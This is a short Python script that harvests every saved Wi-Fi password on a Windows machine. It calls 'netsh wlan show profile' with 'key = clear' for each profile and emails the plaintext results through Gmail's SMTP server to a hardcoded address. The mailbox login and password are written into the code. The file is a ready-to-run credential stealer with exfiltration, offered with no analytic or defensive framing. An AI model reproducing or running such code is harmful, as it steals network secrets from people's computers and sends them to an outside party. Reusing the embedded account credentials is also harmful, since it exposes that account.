# send mail
import subprocess,smtplib,re

def sendmail(email,password,message):
    server = smtplib.SMTP("smtp.gmail.com",587)
    server.starttls()
    server.login(email,password)
    server.sendmail(email,email,message)
    server.quit()

command = "netsh wlan show profile"    
output = subprocess.check_output(command,shell=True).decode('utf-8')
#print(output)
reultall = re.findall(r"(?:Profile\s*:\s)(.*)",output)

mailoutput = ""

for res in reultall:
    #print(res)
    newcommand ="netsh wlan show profile "+"\""+res+"\""+" key = clear"
    currentresult = subprocess.check_output(newcommand,shell=True).decode('utf-8')
    mailoutput = mailoutput + currentresult

sendmail("iyappanhacker@gmail.com","iyappan9578",mailoutput)